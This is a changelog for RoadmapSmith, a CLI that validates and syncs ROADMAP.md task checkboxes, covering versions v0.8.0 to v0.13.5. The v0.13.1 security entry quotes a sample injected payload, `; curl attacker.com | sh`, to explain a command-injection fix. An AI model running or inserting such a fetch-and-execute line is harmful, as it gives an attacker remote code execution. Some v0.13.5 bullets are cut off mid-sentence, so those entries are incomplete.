# Changelog

## Unreleased

- None yet.

## v0.13.5 - 2026-07-15

### Fixed
- (update) multi-point UX polish + release infra hardening (#95)
  - `update --json` now always emits a valid JSON payload on stdout. Pre-fix,
  - Removed the legacy `--evidence-only` flag from `--help`. It has been a
  - Updated the stale `--evidence-only` reference in the validator's weak-
  - `.git/hooks/pre-commit`: replaced the hardcoded Windows Node path
  - Bumped `actions/checkout` v4.3.1 -> v5.0.1 and `actions/setup-node`
  - `scripts/generate-changelog.js` + `scripts/auto-release.js`: commit
  - Repo branch protection: disabled `required_conversation_resolution` on
  - `update --json` without `--audit` still emits a parseable JSON status.
  - `buildReleaseSection` renders commit body `- ` lines as sub-bullets and
  - Release automation tests updated for the new `%s%x1f%b%x1e` git log

## v0.13.4 - 2026-07-15

### Fixed
- (update) clean --json stdout, honest no-op status, useful drift detection (#93)

## v0.13.3 - 2026-07-14

### Fixed
- (release) auto-restore missing "## Unreleased" section in CHANGELOG (#91)

## v0.13.2 - 2026-07-14

Parser tolerance patch. Two silent-rejection bugs surfaced while hand-editing `ROADMAP.md` to strengthen weak-evidence tasks.

### Fixed

- **`- ✅ evidence: <path>` sub-bullets are now parsed as evidence.** `sync/index.js` emits this exact shape when auto-adding evidence, so users reasonably copy it when hand-authoring. Previously `parseEvidenceLine` required the content to start literally with `evidence:` (offset 0), so the leading `✅ ` prefix caused a silent no-op — audit kept flagging the task as weak-evidence, zero diagnostics fired. `parseEvidenceLine` now strips the leading `✅` before the prefix test, making the emitted format roundtrip-safe when hand-authored.
- **Standalone `<!-- rs:kind=rollup -->` markers (and any `rs:` flag without `rs:task=`) are now honored.** `parseTaskLine` only extracted marker flags when the comment body began with `rs:task=`, so `<!-- rs:kind=rollup -->` alone was left inside the task text and never reached the validator's kind check. The docs and audit hint reference `rs:kind=rollup` in isolation, so the shape looked legal. Standalone `rs:` markers now populate `markerFlags` with `markerId=null`, letting downstream kind extraction and deprecated-marker checks run as intended. As a side effect, standalone `<!-- rs:no-test -->` now correctly throws the `migrate-markers` error instead of being silently dropped into the task text.

### Migration

None required. Both changes are additive parser tolerance; no existing marker shape changes behavior.

## v0.13.1 - 2026-07-14

Security + honesty patch. Two critical audit findings from the v0.13.0 review are addressed.

### Security

- **`rs:verified-by` commands now run without shell interpretation and are restricted to an allowlist** (`npm|pnpm|yarn|npx|node|deno|bun|python|python3|pytest|tsc|eslint|prettier|make|cargo|go|dotnet|mvn|gradle|bundle|rake|ruby`). Previously a malicious ROADMAP.md merged via PR could smuggle arbitrary shell payloads (`; curl attacker.com | sh`) into a maintainer's terminal via `roadmapsmith verify --run`. Now the command is `spawnSync(program, args, { shell: false })`, and the program is logged to stderr (`+ node --version`) as an audit trail before execution. If you need a command outside the allowlist, wrap it in an npm/yarn script and reference the script name.

### Fixed

- **`preservedCheckedState` passes surface as `confidence: 'preserved'` instead of `'low'`.** In default mode, a `[x]` task with no evidence used to return `passed: true, confidence: 'low'`, indistinguishable from a real low-confidence pass. Now the value is `'preserved'` with a reason explaining "add rs:kind=manual for explicit attestation, or run with --strict to reject preservation-only passes."
- **`printAudit` reports the count and first 10 preserved-only tasks.** Consumers can grep the JSON output via `audit.preservedOnly`.
- **`applyMinimumConfidence` now correctly downgrades preserved tasks** (rank -1 < low rank 0). Previously an early `if (result.preservedCheckedState) continue;` skipped the filter, making the "add --strict to reject" promise a lie.
- **`rs:verified-by` marker parsing supports multi-token commands.** Previously `\S+` truncated at the first space (so `rs:verified-by=node --version` captured only `node`), forcing users to wrap every command in an npm script. Now the value captures up to the next `rs:` marker or end of flags.

### Migration

None required. `confidence: 'preserved'` is a strict superset of the old `'low'` classification for preserved tasks; consumers that check `if (result.passed)` keep working. Consumers that grouped by `confidence === 'low'` will see cleaner buckets. Command-verified tasks using shell metacharacters in `rs:verified-by=` must migrate to an npm-script wrapper.

## v0.13.0 - 2026-07-13

Coordinated 5-minute-install refactor. Three of the four changes below are breaking. Run `roadmapsmith migrate-markers` in every consumer repo before upgrading.

### Breaking Changes

- **Task markers consolidated.** `rs:evidence=manual` and `rs:no-test` are removed. `parseRoadmap` now throws with a `Deprecated marker …` error when it encounters either. The single axis is now `rs:kind=<rollup|command|manual>` alongside `rs:planned`. `rs:no-test` was a silent no-op and simply drops; `rs:evidence=manual` becomes `rs:kind=manual` (same human-attested bypass semantics). An unknown `rs:kind=<value>` also throws with a message listing the three valid values.
- **`update` no longer flips checkboxes by default.** Without `--apply`, `update` runs in annotate-only mode (⚠️/✅ sub-bullets, no `[ ]/[x]` mutation). Add `--apply` to opt back into the previous behavior. The legacy `--evidence-only` flag is now a silent alias for the new default.
- **`maintain` is deprecated.** It still works but prints `WARNING: 'maintain' is deprecated. Use 'update --apply'.` and forwards to `runUpdate` with `apply: true, audit: true`. Migrate scripts to `update --apply`.

### Added

- `roadmapsmith migrate-markers [--dry-run]` — one-shot migration for legacy marker syntax. Rewrites `rs:evidence=manual` → `rs:kind=manual` and drops `rs:no-test`. Exits 0 on success or when nothing to migrate.
- `product.problemStatement` and `product.targetUser` are now first-class config fields. When set, the professional renderer emits them as `**Problem:**` and `**Target user:**` inside Section 1 (Product North Star). Backwards compat: `zeroMode.problemStatement` is copied into `product.problemStatement` when the latter is empty.
- `roadmapsmith update --check-drift` now exits `2` on drift (previously always exited `0`). CI pipelines can gate on it.
- `docs/legacy-commands.md` centralizes the compatibility surface. The main READMEs now link to it instead of listing legacy commands inline.

### Changed

- `runMaintain` shrank from ~20 lines to a 3-line shim.
- CLI `--help` now lists `migrate-markers` and `--apply`.

### Migration

```bash
# Convert legacy markers before upgrading.
roadmapsmith migrate-markers --project-root . --dry-run   # preview
roadmapsmith migrate-markers --project-root .             # apply

# Replace `maintain` calls in scripts.
- roadmapsmith maintain
+ roadmapsmith update --apply

# Restore v0.12 behavior for CI (annotate + mutate in one shot).
- roadmapsmith update
+ roadmapsmith update --apply
```

### Verification

- 270 / 270 tests pass locally.
- Dogfood: `roadmapsmith migrate-markers --dry-run --project-root ..` on this monorepo reports `Nothing to migrate — already on v0.13 markers.`

## v0.12.2 - 2026-07-13

### Changed
- (deps) bump hashgraph-online/ai-plugin-scanner-action (#84)

## v0.12.1 - 2026-07-13

### Added
- rs:kind=rollup default + validator monorepo fix + dogfood A/B demo

## v0.12.0 - 2026-07-11

### Added
- `rs:kind=rollup` marker attribute: milestone/aggregator tasks pass validation without file-evidence lookup. Their children carry the truth.
- `rs:kind=command` marker attribute + `rs:verified-by=<command>`: command-verified tasks (e.g. `tsc --noEmit`, `pytest`) pass on the marker alone during `update`; the checkbox stays under human/agent control.
- `roadmapsmith verify --task <id> [--run]` subcommand: executes the `rs:verified-by` command for a `rs:kind=command` task and flips `[x]` on exit 0. Without `--run` it prints the command it *would* execute.
- `roadmapsmith update --concise` (alias `--no-warnings`): suppresses ⚠️ warning lines in the emitted markdown. Useful for embedding the roadmap in READMEs or PR descriptions.
- `printAudit` now surfaces a "Command-verified tasks pending run" section listing the exact `verify --task <id> --run` invocation for each unchecked `rs:kind=command` task. Designed so an AI agent (not the human) picks them up and runs them.
- `printAudit` now includes a `checkedWithWeakEvidence` count in the default text summary (previously visible only via `--json`).

### Fixed
- **Bug 1 — File-reference validator now strips `:line[-range][:col]` suffix.** Evidence like `.github/workflows/release.yml:99-144 (Playwright install)` resolves to the file on disk instead of falsely reporting `missing referenced file(s)`. The leading path token is extracted before any trailing prose.
- **Bug 2 — `rs:planned` tasks no longer emit `no implementation evidence found yet` warnings on every refresh.** Sync short-circuits on the parser's `planned` flag and drops any pre-existing warning line.
- **Bug 3 — Two consecutive `update` runs on an unchanged repo now produce a byte-identical diff.** Warning reasons are sorted deterministically inside `normalizeWarningReasons`, and `shouldPreserveExistingWarning` was deleted outright so the warning line is always regenerated from the fresh validator reasons.
- **Bug 4 — Rollups and command-verified tasks no longer pollute the `checkedWithWeakEvidence` audit bucket.** `auditValidation` skips results whose `kind` is `rollup` or `command`.

### Changed
- `shouldPreserveExistingWarning` and its call site in `src/sync/index.js` are removed. Existing warning text is now always overwritten by the fresh validator reason. The three unit tests that guarded the old preservation behavior were flipped into regression guards for the new "always overwrite" contract.
- Unused `isLowSpecificityReason` import dropped from `src/sync/index.js`.

### Verification
- 249 / 249 tests pass.
- Determinism: two consecutive `roadmapsmith update --dry-run` runs on this monorepo produce byte-identical output.
- `roadmapsmith update --concise --dry-run` on this monorepo produces zero `⚠️` lines.

## v0.11.3 - 2026-07-09

### Changed
- add case to prevent duplicate phase headers when inserting tasks

## v0.11.2 - 2026-07-07

### Changed
- (deps) bump hashgraph-online/ai-plugin-scanner-action (#78)

## v0.11.1 - 2026-07-07

### Changed
- (release) sync bundle metadata to v0.11.0

## v0.11.0 - 2026-07-07

### Added
- `sync` now appends a `- ✅ evidence: <text>` sub-bullet whenever it auto-checks a previously unchecked task (`[ ] → [x]`). Text is `discoveredEvidence` when present, otherwise `symbols: ...` or `test imports: ...`. Fixes the silent auto-check that let unbacked tasks flip to done without any visible trail. Suppressed when the task already carries an `Evidence:` line or when the existing `Test evidence:` / `Evidence:` insertion path already fires.
- `applySync` return value now exposes `changes.evidenceMarkersAdded: string[]` — the task IDs that received the new sub-bullet in this run.
- `parseRoadmap` now returns `parseWarnings: Array<{ type, id, lineIndex, firstLineIndex }>`. Emits `duplicate-explicit-id` entries when the same `<!-- rs:task=id -->` marker appears twice. `roadmapsmith update` prints them as warnings (non-JSON output).
- Deletion-task semantics in the validator: a task whose text contains `eliminado|eliminada|borrado|borrada|deleted|removed|dropped` AND names an explicit path passes when that file is absent, fails with `expected file removed, still present at <path>` when it still exists. Result carries `deletionTask: true`.
- `pathAliases` field in `roadmap-skill.config.json` (default `{}`). Object mapping prefix → replacement (e.g. `{ "/dashboard/": "apps/web/src/app/dashboard/" }`) applied by `buildPathHintResolver` after direct/endsWith resolution misses. Unblocks monorepos whose task text keeps the source-tree-relative prefix.
- `roadmapsmith update --evidence-only`: adds ⚠️ / ✅ sub-bullets and audit output as usual but does NOT flip any `[ ]`/`[x]` checkbox. `changes.newlyChecked` and `changes.newlyUnchecked` stay empty. Intended as a safe review pass before running the mutating default.
- Cause taxonomy on failing validation results: `result.cause` is one of `'deletion-task' | 'namespace-gate' | 'path-mismatch' | 'strict-mode' | 'no-evidence'`. Assigned by a post-pass in `validateTasks`. `printAudit` groups `Checked without evidence` by cause (`by cause: path-mismatch=3, no-evidence=1, …`) and prefixes each item line with `[<cause>]`.
- Actionable hint suffixes appended to five reason strings in the validator: `missing referenced file(s): … → if this is a monorepo, add pathAliases in roadmap-skill.config.json` (three call sites), `file reference shows implementation location, not confirmed completion → if implementation is complete, mark [x] and re-run with --evidence-only`, and `no implementation evidence found in pass 1 … → add explicit evidence: 'roadmapsmith update --task <id> --evidence <path>'`. Existing consumers that used `.includes('missing referenced file')` or `.startsWith('file reference shows implementation location')` still match.

### Changed
- `skills/roadmap-update/SKILL.md` (and its plugin mirror) reordered to lead with `--audit --dry-run` preview as Step 1, and adds a `## Safety` block naming both mutation directions plus a `## Known limitations` block and a pre-flight checklist for monorepo, duplicate-ID, and deletion-task footguns. Limitations block updated to reflect that deletion tasks, duplicate IDs, and `pathAliases` are now handled.

## v0.10.3 - 2026-07-06

### Added
- add support for human-attested task bypass and declined task handling in validation

## v0.10.2 - 2026-06-30

### Changed
- Potential fix for code scanning alert no. 22: Regular expression injection (#75)

## v0.10.1 - 2026-06-30

### Added
- v0.10.0 — two-command CLI, unified renderer, technical debt cleanup
- add maintain and doctor commands to CLI for roadmap management

### Changed
- add unreleased section to CHANGELOG.md

## v0.10.0 - 2026-06-29

### Breaking

- CLI reduced from 11 commands to 2: `init` and `update`. Commands removed: `zero`, `generate`, `maintain`, `sync`, `validate`, `setup`, `doctor`, `status`, `regenerate`.
- Skills bundle reduced from 11 skills to 2: `roadmap-init` and `roadmap-update`. Removed skills: `roadmap`, `roadmap-audit`, `roadmap-generate`, `roadmap-maintain`, `roadmap-setup`, `roadmap-status`, `roadmap-sync`, `roadmap-validate`, `roadmap-zero`.
- `src/zero.js` removed from the package.

### Added

- `roadmapsmith init` — creates ROADMAP.md (from parameterised template with `--product-name`, `--primary-user`, `--problem-statement`), AGENTS.md, and host integration files. Accepts `--import <file>` to pull tasks from an existing file, `--setup-only` to skip document creation, and `--dry-run`.
- `roadmapsmith update` — four modes: default refresh (evidence-backed validate + sync), `--add-task`, `--task + --evidence`, and `--check-drift`. Accepts `--audit`, `--strict`, `--json`, `--dry-run`.
- `src/importer.js` — imports tasks from any Markdown file with `<!-- rs:task= -->` markers, deduplicating by first-seen ID.
- `src/drift.js` — detects northStar alignment vs. detected repo languages, test frameworks, and project type.
- `src/addTask.js` — inserts a task into the managed block with a stable slugified ID.
- Roadmap template now accepts `{{productName}}`, `{{productNorthStar}}`, `{{primaryUser}}`, `{{problemStatement}}` tokens.

## v0.9.39 - 2026-06-29

### Added
- Zero Mode doneCriteria tasks, rs:planned marker, VS Code skip, module detection (0.9.39)

## v0.9.39 - 2026-06-29

### Added
- `--done-criterion` flags now generate concrete P0 tasks in the Phased Roadmap (Zero Mode), auto-marked `rs:planned` so `validate` skips them until work begins
- `validate` recognises `<!-- rs:planned -->` marker: planned tasks print as `PLAN:<id>` with no exit-1 penalty; `--hide-planned` suppresses them
- `status`/`doctor` auto-skip VS Code checks when `.vscode/` is absent; `--no-vscode` forces the skip; exit code is clean for CLI-only repos
- `detectCommands` reads `package.json` `bin` field and `pyproject.toml` `[project.scripts]`/`[tool.poetry.scripts]`; `detectModules` finds Python flat-layout packages (`__init__.py` at root)
- Section 6 (Maturity Path) generates 2 fallback tasks per module when no metadata is configured; module metadata moved from hardcoded renderer constant to `moduleMetadata` config field
- `inspectHostSetup` accepts `options.skipVscode` — skips `inspectVsCodeTasks` entirely for repos without `.vscode/`
- `/roadmap-audit` is now read-only (same contract as `sync --audit`): validates without mutating ROADMAP.md, exits 2 on mismatch
- `compact` profile (default) emits `rs:planned` marker for Zero Mode tasks; `--full-regen` respects manual marker removal (unlock workflow)
- Preserve-mode insertions emit `rs:planned` marker for new Zero Mode tasks

### Fixed
- `detectCommands` now emits a stderr warning on malformed `package.json` instead of swallowing `SyntaxError` silently
- `inspectHostSetup` skip stub now includes `wrappers.windows` and `wrappers.posix` fields to match real payload shape
- ReDoS vulnerability in `slugify` (`/^-+|-+$/` → `/^-|-$/`); dead identity-replacement removed from `normalizePathCandidateToken`

## v0.9.38 - 2026-06-29

### Changed
- (deps) bump hashgraph-online/ai-plugin-scanner-action (#71)

## v0.9.37 - 2026-06-28

### Changed
- pass NODE_AUTH_TOKEN to auto-release step for npm publish (#69)

## v0.9.36 - 2026-06-28

### Added
- sync --audit read-only, build artifact exclusion, docs/human escape hatches, sync diff (0.9.35) (#67)

## v0.9.34 - 2026-06-24

### Changed
- Harden roadmap maintain and zero UX (#65)

## v0.9.33 - 2026-06-22

### Fixed
- restore package-lock.json and remove it from .gitignore (#63)

### Changed
- pin actions to SHA, add .codexignore and dependabot.yml (#59)

## v0.9.32 - 2026-06-21

### Changed
- add HOL AI Plugin Scanner workflow (#57)

## v0.9.31 - 2026-06-21

### Fixed
- extend annotation preservation to all low-specificity policy messages (#55)

## v0.9.30 - 2026-06-21

### Fixed
- align update and sync command contract (#53)

## v0.9.29 - 2026-06-21

### Fixed
- require deterministic maintain evidence (#51)

## v0.9.28 - 2026-06-20

### Fixed
- harden roadmap validation and update workflow (#49)

## v0.9.27 - 2026-06-19

### Changed
- add cli black-box regression coverage (#47)

## v0.9.26 - 2026-06-19

### Fixed
- resolve validator path hints for routes and home refs (#45)

## v0.9.25 - 2026-06-19

### Fixed
- tighten validator sync and status surface (#42)

## v0.9.24 - 2026-06-19

### Fixed
- tighten roadmap sync warning semantics

## v0.9.23 - 2026-06-19

### Fixed
- stabilize self-hosting roadmap maintenance (#38)

## v0.9.22 - 2026-06-18

### Added
- harden plugin bundle surfaces, preserve roadmap maintenance, and namespace slash commands (#26)
- automate patch releases on main pushes (#27)

### Fixed
- make auto-release respect protected main (#28)
- use release bot token for automated release PRs (#29)
- unblock release CI loop on main (#31)
- detect release squash commits in repair mode (#36)

### Changed
- (release) v0.9.17 [skip ci] (#30)

## v0.9.21 - 2026-06-18

### Added
- harden plugin bundle surfaces, preserve roadmap maintenance, and namespace slash commands (#26)
- automate patch releases on main pushes (#27)

### Fixed
- make auto-release respect protected main (#28)
- use release bot token for automated release PRs (#29)
- unblock release CI loop on main (#31)

### Changed
- (release) v0.9.17 [skip ci] (#30)
- (release) v0.9.18 (#32)
- (release) v0.9.19 (#33)
- (release) v0.9.20 (#34)

## v0.9.20 - 2026-06-18

### Added
- harden plugin bundle surfaces, preserve roadmap maintenance, and namespace slash commands (#26)
- automate patch releases on main pushes (#27)

### Fixed
- make auto-release respect protected main (#28)
- use release bot token for automated release PRs (#29)
- unblock release CI loop on main (#31)

### Changed
- (release) v0.9.17 [skip ci] (#30)
- (release) v0.9.18 (#32)
- (release) v0.9.19 (#33)

## v0.9.19 - 2026-06-18

### Added
- harden plugin bundle surfaces, preserve roadmap maintenance, and namespace slash commands (#26)
- automate patch releases on main pushes (#27)

### Fixed
- make auto-release respect protected main (#28)
- use release bot token for automated release PRs (#29)
- unblock release CI loop on main (#31)

### Changed
- (release) v0.9.17 [skip ci] (#30)
- (release) v0.9.18 (#32)

## v0.9.18 - 2026-06-18

### Added
- harden plugin bundle surfaces, preserve roadmap maintenance, and namespace slash commands (#26)
- automate patch releases on main pushes (#27)

### Fixed
- make auto-release respect protected main (#28)
- use release bot token for automated release PRs (#29)
- unblock release CI loop on main (#31)

### Changed
- (release) v0.9.17 [skip ci] (#30)

## v0.9.17 - 2026-06-18

### Added
- harden plugin bundle surfaces, preserve roadmap maintenance, and namespace slash commands (#26)
- automate patch releases on main pushes (#27)

### Fixed
- make auto-release respect protected main (#28)
- use release bot token for automated release PRs (#29)

## v0.9.16 - 2026-06-13

### Added
- Native Claude GUI slash skill bundle: `/road`, `/zero`, `/maintain`, `/status`, `/init`, `/generate`, `/validate`, `/sync`, `/audit`, and `/setup`, while keeping `/roadmap-sync` as the legacy namespaced entrypoint.
- Skill-manifest regression coverage to ensure `skills.json` stays aligned with the on-disk Claude bundle and install contract.

### Changed
- Claude onboarding now recommends installing the full RoadmapSmith skill bundle with `npx skills add PapiScholz/roadmapsmith --skill '*' -a claude-code` instead of teaching `roadmap-sync` as the only visible slash command.
- Root/package README, release-readiness docs, and Claude-use-case docs now separate the three layers explicitly: Claude GUI skills expose native slash commands, the CLI executes actions, and `setup` configures VS Code tasks plus the optional Claude hook.
- Claude plugin metadata now advertises the full slash-command surface and tells users to reload skills/plugins in the current session after install or update.

## v0.9.15 - 2026-06-13

### Added
- `roadmapsmith zero`: one-command Zero Mode flow for empty or low-context repositories. Runs the terminal discovery interview, persists the brief into config, creates governance files when needed, and generates the first roadmap.
- `roadmapsmith maintain`: one-command existing-repository flow that runs `generate + sync + audit`.
- Slash aliases for the new public entrypoints: `/zero`, `/maintain`, `/road zero`, `/road maintain`, `/roadmap-sync zero`, and `/roadmap-sync maintain`.
- New visible VS Code tasks: `RoadmapSmith: Zero Mode` and `RoadmapSmith: Maintain`.
- Release UX gate documentation in `docs/release-ux-gate.md`.

### Changed
- Public product contract now recommends `setup`, `zero`, and `maintain` before the lower-level manual commands.
- Zero Mode no longer depends on a free-form agent prompt as the primary user surface; the `roadmap-sync` skill remains the policy/governance layer.
- Status/help/launcher output now teaches the one-command flow and clarifies that skill installation alone does not expose CLI behavior in VS Code.
- Release-readiness and use-case docs now reflect the VS Code-first host UX, additive host setup, and current mutating `sync --audit` semantics.

### Fixed
- Generated launcher smoke coverage now verifies `maintain` in a temporary project using a resolvable workspace CLI shim.

## v0.9.14 - 2026-06-09

### Changed
- Professional roadmap output now tracks the operational follow-up work around autoupdate reliability, hook behavior, sync contract clarity, and targeted testing/documentation gaps.

### Docs
- Clarified that `sync --audit` currently runs the normal sync mutation path and then prints a mismatch summary; it is not yet a dedicated read-only audit mode.
- Documented the current host support split: Claude Code has the clearest automation path today, while Codex/Codex CLI remains a manual CLI workflow.
- Documented the current Claude write-time hook reliability boundaries, including its dependence on `node` resolution in the host environment and its distinction from the repository `pre-commit` hook.

## v0.9.13 - 2026-05-17

### Fixed
- **Action-verb gate**: Removed `confidence !== 'high'` from the gate condition. The confidence system cannot distinguish "this test covers the described feature" from "this test imports the same module coincidentally" — when `evidence.code=true` and `evidence.test=true` (from unrelated test imports), `confidence='high'` was bypassing the gate and marking action tasks complete without explicit evidence. Action tasks now require only explicit evidence: an `Evidence:` line, a canonical artifact, or a `grant-evidence` config rule.

## v0.9.12 - 2026-05-17

### Fixed
- `taskDescribesChange()` replaces the previous exact-verb `Set` with regex patterns that also match noun forms ("Manejo") and two-word constructions ("Recovery path") — catches all 5 remaining false positives.
- Confidence 'high' now requires `evidence.test` in addition to `meetsStrongThreshold` (code + feature-surface alone is 'medium'). This ensures the action-task gate fires even when an unrelated test file happens to import the same module, which was preventing the gate from blocking tasks 3–5.
- `isLikelyPath` now rejects `/api/*` HTTP route paths (e.g. `/api/backup`, `/api/products/[sku]`) so they no longer appear as "missing referenced file(s)" in validation reasons.

## v0.9.11 - 2026-05-16

### Fixed
- **Causa 1 — Blocked-by in child bullets**: Parser now extracts `blockedByIds` from child-bullet `- Blocked by: task-id, ...` lines (previously only inline "Blocked by:" in task text was recognised). `validateTasks` post-pass checks both sources, so a milestone whose dependencies are listed as child bullets now correctly stays failed when any dependency is incomplete.
- **Causa 2 — Existing ⚠️ warning bypassed by token match**: Unchecked tasks that already carry a `⚠️ attempted but validation failed:` warning are now kept failing even when `meetsStrongThreshold` is true (code + feature-surface ≥ 2 categories). The warning represents a prior human/agent judgment that code token overlap must not override. Only an explicit `Evidence:` line (`authoritativeEvidence.passed = true`) can clear it.
- **Causa 3 — Action-verb tasks auto-pass on token match**: Unchecked tasks whose text starts with a pending-work verb (Agregar, Configurar, Add, Fix, Implement, …) now require either an `Evidence:` line, test evidence, grant-evidence from config, or canonical artifact evidence to pass. Code token overlap alone (path hint exists + tokens in file content = 2 categories) is no longer sufficient — the verb signals that work is still to be done.

## v0.9.10 - 2026-05-16

### Fixed
- `isLikelyPath` now rejects bare `/` and other empty-segment slash tokens (e.g. the separator in "Web Serial API / ESC-POS") — fixes regression where `p1-thermal-printer` was failing with `missing referenced file(s): /`.
- Backtick-quoted property access like `` `err.message` `` or `` `error.stack` `` is no longer extracted as a path hint — requires a `/` or a known file extension; fixes `prod-sanitize-error-messages` false negative.
- `evidence.files` now uses only pure path hints (excluding line-reference hints like `file.ts:169`) so line-reference hints no longer inflate `strongEvidenceCount` via the `feature-surface` category and no longer push tasks past `meetsStrongThreshold` with unrelated code evidence.
- `hasDirectReferencePass` (file referenced in task text exists) is no longer sufficient alone to pass an unchecked task — it showed WHERE to implement, not that implementation is done. Unchecked tasks now require authoritative evidence, artifact evidence, or the strong code+test threshold. Unchecked tasks that fail only on this condition receive the reason `"file reference shows implementation location, not confirmed completion"`.
- Already-checked `[x]` tasks with referenced files that exist are preserved via `shouldPreserveCheckedTask` (new case 2: `hasDirectReferencePass = true` + no strong evidence → preserve rather than uncheck).
- `authoritativeEvidence.passed = true` suppresses `missing referenced file(s)` reasons — a confirmed Evidence line overrides a bad/moved path hint in the task text.

## v0.9.9 - 2026-05-16

### Fixed
- `evidenceLineHasPassingSummary` now accepts `"N tests passing"` without requiring the `N/N` fraction format — fixes false negative when Evidence lines use bare count.
- `extractExplicitPaths` filters glob tokens (`*`, `?`) so `/api/*` is never extracted as a path hint, allowing the preservation logic to keep checked tasks intact.
- `requiresTest` is no longer enforced when the task text references a file that exists in the repo (`filesFromPurePathHints.length > 0`) — fixes false negative on tasks with direct file evidence.
- Path hints with line-number suffixes (`file.ts:169`, `file.ts:13-15`) are tracked as `lineReferenceHints` and excluded from `hasDirectReferencePass` — a file existing at the referenced path no longer marks an unimplemented task as complete.
- `shouldPreserveCheckedTask` now uses `purePathHints` (excluding line-reference hints) so checked tasks that only mention implementation locations are correctly preserved.
- `validateTasks` post-pass blocks milestone tasks that declare `Blocked by: task-id` when any listed dependency has `passed: false`.
- `applySync` preserves a more descriptive existing warning over a shorter generic `"validation failed"` message on re-sync.

## v0.9.8 - 2026-05-16

### Fixed
- Validator now preserves already-checked tasks that lack machine-readable evidence (`preservedCheckedState`), preventing false negatives from silently unchecking legitimately completed tasks.
- Removed `TODO`, `FIXME`, and `disabled` from negative implementation signals — these appear in normal codebases and were causing false negatives in unrelated task validations.
- `minimumConfidence` threshold now skips tasks in preserved-checked state, so the threshold can't undo a valid preservation decision.

### CI / Release
- `publish_needed` and `github_release_needed` are now independent flags in the release workflow — a GitHub Release is created whenever the tag doesn't exist, regardless of whether npm publish ran.
- `npm view` failure is now distinguished between E404 (package not yet published) and real network/registry errors.

## v0.9.7 - 2026-05-16

### Fixed
- Validator now treats task-local `Evidence:` lines as authoritative when they reference real files or explicit passing test summaries, preventing false negatives during `sync --audit`.
- Heuristic completion is stricter for implementation tasks, blocking weak single-signal matches and explicit negative signals like `disabled` or `not implemented`.
- Parser and validator path extraction were rewritten with linear string parsing to resolve CodeQL ReDoS alerts on roadmap and evidence input handling.

## v0.9.6 - 2026-05-16

### Fixed
- `roadmapsmith sync` now scopes validation and updates to existing `rs:managed` blocks instead of allowing managed content to be structurally replaced.
- Existing managed roadmap blocks preserve custom headings, business context, task order, and task presence; sync only updates checkbox state and validation warning lines.
- Added regression coverage for weak path-only evidence so failed tasks receive a single warning without regenerating generic roadmap content.

### CI / Release
- Fixed GitHub Release note extraction to support `vX.Y.Z`, `[X.Y.Z]`, and `[vX.Y.Z]` changelog headings.
- Bumped the npm package to `0.9.6` so the release workflow publishes a new package and GitHub Release.

## v0.9.4 - 2026-05-14

### Fixed
- `grant-evidence` can now satisfy required test evidence without `overrideResult: true`.
- Validator test evidence now recognizes tests that read explicitly referenced files with `readFile` / `readFileSync`.
- Validator rules can target stable task IDs with `whenId`.
- CI validate smoke test now targets a roadmap task with current repository evidence.

### CI / Release
- Switched npm publishing back to Trusted Publishing/OIDC by using `id-token: write` and removing the static `NPM_TOKEN` publish path.

## v0.9.2 - 2026-04-29

### CI / Release
- Switched npm publish auth from OIDC Trusted Publishing to Granular Access Token with "Bypass two-factor authentication" enabled.
- Changed package Publishing access setting on npmjs.com to allow bypass-2FA tokens (required for static token CI workflows).
- Fixed empty GitHub Release notes: awk extraction now correctly picks up CHANGELOG sections.

## v0.9.1 - 2026-04-29

### CI / Release
- Workflow de GitHub Actions autopublica en npm y crea GitHub Release al detectar versión nueva en `package.json`.

## v0.9.0 - 2026-04-29

### Added
- `--version` / `-v` CLI flag: prints the installed package version and exits with code 0.

## v0.8.0 - 2026-04-28

### Added
- NANDI landing-site customer test: npm global install, project detection, web-specific task generation (SEO, OpenGraph, Lighthouse, deployment, security headers), and idempotent sync.
- Detected Project Profile section in generated ROADMAP.md for all profiles.
- `sync --audit` idempotency: 0 checked-without-evidence, 0 ready-but-unchecked on clean pass.
